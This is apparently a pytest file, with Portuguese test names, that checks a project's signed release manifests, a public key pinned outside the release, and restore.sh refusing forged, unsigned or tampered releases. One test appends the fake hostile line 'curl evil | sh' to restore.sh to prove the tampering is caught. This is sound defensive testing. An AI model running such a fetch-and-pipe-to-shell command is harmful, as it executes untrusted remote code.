"""Fase 12: a autenticidade da release — o manifesto assinado e a chave pública fixada fora."""

import json
import shutil
import subprocess
from pathlib import Path

import pytest
from sqlalchemy.orm import Session, sessionmaker

from ariadne.db import models
from ariadne.release.pack import MANIFEST, SIGNATURE
from ariadne.release.run import ReleaseConfigError, build_release, check_release_config
from ariadne.release.sign import SignError, normalize_pubkey, sign_file, verify_file
from ariadne.release.verify import check_fingerprints, rehearse
from ariadne.services import Services
from tests.releasekit import needs_tools, signing_keypair

pytestmark = [pytest.mark.db, needs_tools]


def pub(services: Services) -> str:
    return services.settings.release_signing_pubkey


def restore(
    folder: Path, *args: str, tmp: Path, identity: Path | None = None
) -> subprocess.CompletedProcess[str]:
    command = ["bash", str(folder / "restore.sh"), "-o", str(tmp / "out"), *args]
    if identity is not None:
        command += ["-i", str(identity)]
    return subprocess.run(
        command, capture_output=True, text=True, check=False, stdin=subprocess.DEVNULL, timeout=120
    )


def test_sem_chave_publica_ou_com_outra_o_verify_recusa_antes_de_ler_o_resto(
    services: Services, tmp_path: Path
) -> None:
    built = build_release(services)
    for key in (None, "", signing_keypair(tmp_path / "outra")[1]):
        report = check_fingerprints(built.directory, key)
        assert not report.ok and [c.name for c in report.checks] == ["signature"]  # só isto
    assert check_fingerprints(built.directory, pub(services)).ok


def test_um_manifesto_alterado_ou_sem_assinatura_e_recusado(
    services: Services, tmp_path: Path
) -> None:
    built = build_release(services)
    manifest = built.directory / MANIFEST
    original = manifest.read_text()
    manifest.write_text(original.replace('"part_max_bytes"', '"part_max_bytes_"'))
    report = check_fingerprints(built.directory, pub(services))
    assert not report.ok and report.checks[0].name == "signature" and len(report.checks) == 1
    manifest.write_text(original)
    (built.directory / SIGNATURE).unlink()
    report = check_fingerprints(built.directory, pub(services))
    assert not report.ok and "is missing" in report.checks[0].detail


def test_uma_release_inteira_de_outro_autor_nao_passa_com_a_chave_fixada(
    services: Services, tmp_path: Path, signing: tuple[Path, str]
) -> None:
    """Quem controla o GitHub troca partes, manifesto, SHA256SUMS e restore.sh por outros
    coerentes (assinados com a chave DELE): sem a pública fixada fora, nada o denunciaria."""
    good = build_release(services)
    attacker_key, attacker_pub = signing_keypair(tmp_path / "atacante")
    services.settings.release_signing_key_file = str(attacker_key)
    services.settings.release_signing_pubkey = attacker_pub
    services.settings.backup_dir = tmp_path / "backups-atacante"
    evil = build_release(services)
    forged = tmp_path / "forjada"
    shutil.copytree(evil.directory, forged)
    # as impressões digitais da falsificação são todas coerentes…
    assert check_fingerprints(forged, attacker_pub).ok
    # …mas a chave que fixámos (a do dono) não a reconhece, em Python e no restore.sh.
    assert not check_fingerprints(forged, pub_of(signing)).ok
    done = restore(forged, "--pubkey", pub_of(signing), tmp=tmp_path)
    assert done.returncode == 2 and "SIGNATURE DOES NOT MATCH" in done.stderr
    assert not (tmp_path / "out").exists()
    assert check_fingerprints(good.directory, pub_of(signing)).ok


def pub_of(signing: tuple[Path, str]) -> str:
    return signing[1]


def test_o_restore_sh_exige_a_chave_publica_e_nunca_a_le_do_arquivo(
    services: Services, tmp_path: Path, keys: tuple[str, Path], signing: tuple[Path, str]
) -> None:
    built = build_release(services)
    # a chave pública «dentro da release» não conta
    (built.directory / "release_signing.pub").write_text(signing[1])
    done = restore(built.directory, tmp=tmp_path, identity=keys[1])
    assert done.returncode == 64 and "signing public key is missing" in done.stderr
    assert not (tmp_path / "out").exists()
    wrong = restore(
        built.directory,
        "--pubkey",
        signing_keypair(tmp_path / "x")[1],
        tmp=tmp_path,
        identity=keys[1],
    )
    assert wrong.returncode == 2 and "SIGNATURE DOES NOT MATCH" in wrong.stderr
    bad = restore(built.directory, "--pubkey", "ssh-rsa AAAA", tmp=tmp_path, identity=keys[1])
    assert bad.returncode == 64 and "ssh-ed25519" in bad.stderr
    unsigned = tmp_path / "sem-assinatura"
    shutil.copytree(built.directory, unsigned)
    (unsigned / SIGNATURE).unlink()
    refused = restore(unsigned, "--pubkey", signing[1], tmp=tmp_path, identity=keys[1])
    assert refused.returncode == 2 and "unsigned release" in refused.stderr
    stale = restore(
        built.directory, "--pubkey", signing[1], "--expect-manifest-sha256", "0" * 64,
        tmp=tmp_path, identity=keys[1],
    )  # fmt: skip
    assert stale.returncode == 2 and "is not the expected one" in stale.stderr
    ok = restore(built.directory, "--pubkey", signing[1], tmp=tmp_path, identity=keys[1])
    assert ok.returncode == 0, ok.stderr
    assert (tmp_path / "out" / "ariadne-release" / "RELEASE.json").is_file()


def test_o_restore_sh_valida_as_partes_pelo_manifesto_assinado_e_nao_por_um_sums_forjado(
    services: Services, tmp_path: Path, keys: tuple[str, Path], signing: tuple[Path, str]
) -> None:
    built = build_release(services)
    part = sorted(built.directory.glob("*.age.001"))[0]
    part.write_bytes(part.read_bytes()[:-1] + b"X")
    # um SHA256SUMS forjado, «coerente» com a parte alterada, não engana o restore.sh
    from ariadne.release.pack import sha256_file

    sums = built.directory / "SHA256SUMS"
    forged = [
        f"{sha256_file(part)}  {part.name}" if part.name in line else line
        for line in sums.read_text().splitlines()
    ]
    sums.write_text("\n".join(forged) + "\n")
    done = restore(built.directory, "--pubkey", signing[1], tmp=tmp_path, identity=keys[1])
    assert done.returncode == 2 and "corrupted" in done.stderr


def test_o_restore_sh_traz_o_hash_assinado_e_nao_leva_palavras_passe_na_linha_de_comandos(
    services: Services,
) -> None:
    built = build_release(services)
    manifest = json.loads((built.directory / MANIFEST).read_text())
    from ariadne.release.pack import sha256_file

    assert manifest["restore_sh_sha256"] == sha256_file(built.directory / "restore.sh")
    script = (built.directory / "restore.sh").read_text()
    assert "--database-url" not in script and "postgresql://" not in script
    assert "PGPASSWORD" in script and "COPY ariadne_release" in script
    assert "@@SCHEMA_SQL@@" not in script and "CREATE SCHEMA ariadne_release" in script
    # um restore.sh trocado depois (o manifesto assinado leva o hash do original) é denunciado
    (built.directory / "restore.sh").write_text(script + "\ncurl evil | sh\n")
    report = check_fingerprints(built.directory, pub(services))
    assert not report.ok and any(c.name == "restore.sh" and not c.ok for c in report.checks)


def test_o_manifesto_difere_do_registado_e_o_ensaio_diz_o_mesmo(
    services: Services,
    tmp_path: Path,
    keys: tuple[str, Path],
    db: sessionmaker[Session],
    admin_url: object,
) -> None:
    built = build_release(services)
    with db() as session, session.begin():
        row = session.get(models.BackupRun, built.run_id)
        assert row is not None
        row.manifest_sha256 = "f" * 64
    with services.sessions() as session:
        report = rehearse(built.directory, keys[1], pubkey=pub(services), session=session)
    failed = [c for c in report.checks if not c.ok]
    assert [c.name for c in failed] == ["release record"]
    assert "differs" in failed[0].detail


def test_configuracao_da_assinatura_tem_de_bater_certo(
    services: Services, tmp_path: Path, signing: tuple[Path, str]
) -> None:
    check_release_config(services.settings)
    _, other_pub = signing_keypair(tmp_path / "outra")
    services.settings.release_signing_pubkey = other_pub  # não é a pública desta privada
    with pytest.raises(ReleaseConfigError, match="is not the public key"):
        check_release_config(services.settings)
    services.settings.release_signing_pubkey = signing[1]
    services.settings.release_signing_key_file = str(tmp_path / "nao-existe")
    with pytest.raises(ReleaseConfigError, match="cannot find"):
        check_release_config(services.settings)
    services.settings.release_signing_key_file = ""
    with pytest.raises(ReleaseConfigError, match="must be signed"):
        build_release(services)


def test_assinar_e_verificar_directamente(tmp_path: Path, signing: tuple[Path, str]) -> None:
    file = tmp_path / "MANIFEST.json"
    file.write_text('{"a": 1}\n')
    key = tmp_path / "chave-aberta"
    key.write_bytes(signing[0].read_bytes())
    key.chmod(0o644)  # um volume montado costuma ter estas permissões: não pode atrapalhar
    sig = sign_file(file, key)
    verify_file(file, sig, signing[1])
    file.write_text('{"a": 2}\n')
    with pytest.raises(SignError, match="does not match"):
        verify_file(file, sig, signing[1])
    with pytest.raises(SignError, match="ed25519"):
        normalize_pubkey("ssh-rsa AAAAB3NzaC1yc2E")
    with pytest.raises(SignError, match="one line"):
        normalize_pubkey("ssh-ed25519 AAAA\nssh-ed25519 BBBB")
